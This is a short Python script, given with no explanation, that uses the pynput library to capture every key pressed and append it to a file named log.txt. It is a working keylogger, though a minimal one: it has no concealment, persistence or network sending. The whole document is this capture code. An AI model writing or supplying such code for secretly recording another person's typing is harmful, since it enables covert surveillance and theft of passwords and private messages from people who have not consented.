from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

with keyboard.Listener(on_press=on_press) as listner:
    listner.join()
